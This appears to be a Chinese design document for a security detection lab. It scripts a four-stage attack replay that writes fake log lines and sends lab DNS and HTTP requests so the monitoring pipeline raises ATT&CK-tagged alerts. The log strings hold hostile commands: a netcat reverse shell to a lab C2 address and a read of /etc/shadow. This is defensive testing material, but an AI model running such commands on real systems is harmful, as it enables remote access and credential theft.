# 攻击场景与复现剧本

## 文档目的

本文件定义用于验收与演示的固定攻击复现剧本，明确每一步的攻击动作、产生的证据类型、以及在系统中的预期可观测输出。

## 读者对象

- 靶场负责人（负责复现与证据准备）
- 负责演示的同学（用于讲述与现场操作）
- 测试负责人（用于验收用例复用）

## 引用关系

- 验收用例：`21-验收标准与验收用例.md`
- 运维与靶场：`../90-运维与靶场/91-靶场部署.md`、`../90-运维与靶场/92-一键编排.md`
- 字段口径：`../80-规范/81-ECS字段规范.md`

## 1. 靶场角色与前置条件

### 1.1 节点角色

本剧本使用以下节点角色（名称固定）：

- `center`：中心机
- `client-01`：受害主机 1
- `client-02`：受害主机 2
- `client-03`：受害主机 3
- `client-04`：受害主机 4
- `c2`：命令与控制服务器

### 1.2 前置条件

1. 上述节点全部启动并在线，中心机注册表中可见全部客户机。
2. 客户机侧采集链路正常：Falco、Filebeat、Suricata 均在运行。
3. 轮询与分析链路已启用：中心机能够周期性拉取并写入存储。

## 2. 攻击阶段与动作序列

本剧本固定为 4 个阶段，按顺序执行，不允许跳步。剧本目标是稳定产出：

1. 至少 3 个不同 ATT&CK 战术阶段的告警（Canonical Findings 可生成）；
2. 可在图中观察到与 C2 相关的 DNS 与 HTTP 证据边；
3. 可触发一次溯源任务并写回关键路径边属性。

所有命令均在 **客户机宿主机** 上执行（不是在容器内执行）。

### 阶段 1 凭据访问模拟（TA0006）

**动作（固定命令）**

在 `client-01` 上执行：

```bash
logger -p authpriv.notice "Failed password for root from 203.0.113.10 port 2222 ssh2"
```

**预期证据（固定）**

- Filebeat：读取 `/var/log/auth.log` 并输出事件
- Filebeat Sigma detector：匹配 `root_brute_force.yml`，产生 `event.kind="alert"` 的 Raw Finding

**系统预期输出（固定）**

- OpenSearch `raw-findings-*` 中出现 `event.dataset="finding.raw.filebeat_sigma"` 且 `threat.tactic.id="TA0006"` 的文档

### 阶段 2 执行阶段模拟（TA0002）

**动作（固定命令）**

在 `client-01` 上执行：

```bash
logger -p user.notice "nc -e /bin/sh 10.92.35.50 4444"
```

**预期证据（固定）**

- Filebeat：读取 `/var/log/syslog` 并输出事件
- Filebeat Sigma detector：匹配 `reverse_shell.yml`，产生 Raw Finding

**系统预期输出（固定）**

- OpenSearch `raw-findings-*` 中出现 `threat.tactic.id="TA0002"` 的文档

### 阶段 3 数据收集模拟（TA0009）

**动作（固定命令）**

在 `client-01` 上执行：

```bash
logger -p user.notice "read /etc/shadow"
```

**预期证据（固定）**

- Filebeat Sigma detector：匹配 `sensitive_file_access.yml`，产生 Raw Finding

**系统预期输出（固定）**

- OpenSearch `raw-findings-*` 中出现 `threat.technique.id="T1005"` 且 `threat.tactic.id="TA0009"` 的文档

### 阶段 4 C2 通信证据（DNS + HTTP）

**动作（固定命令）**

在 `client-01` 上执行：

```bash
dig @10.92.35.50 c2.lab.local A
curl -sS --resolve c2.lab.local:80:10.92.35.50 http://c2.lab.local/ -o /dev/null
```

**预期证据（固定）**

- Suricata：DNS 与 HTTP Telemetry（`event.dataset="netflow.dns"` 与 `event.dataset="netflow.http"`）

**系统预期输出（固定）**

- OpenSearch `ecs-events-*` 中出现 `event.dataset="netflow.dns"` 与 `event.dataset="netflow.http"` 的事件文档

## 3. 证据点与预期输出

本节给出“从动作到系统输出”的固定对应关系：

| 阶段 | 数据源 | 事件类型 | ECS dataset 口径 |
|---|---|---|---|
| 凭据访问模拟 | Filebeat Sigma | 告警 | `finding.raw.filebeat_sigma` |
| 执行阶段模拟 | Filebeat Sigma | 告警 | `finding.raw.filebeat_sigma` |
| 数据收集模拟 | Filebeat Sigma | 告警 | `finding.raw.filebeat_sigma` |
| C2 通信证据 | Suricata | DNS 与 HTTP | `netflow.dns`、`netflow.http` |

详细字段要求见：`../80-规范/81-ECS字段规范.md`。

## 4. 复现后的验收关联

本剧本执行完成后，按以下顺序执行验收：

1. `AC-01` 到 `AC-03` 验证采集、入库、告警
2. 执行一次中心机侧入图：`cd backend && uv run python -m app.services.neo4j.load`
3. `AC-04` 验证图查询
4. `AC-05` 到 `AC-07` 验证溯源任务与相似度输出
5. `AC-08` 验证报告导出
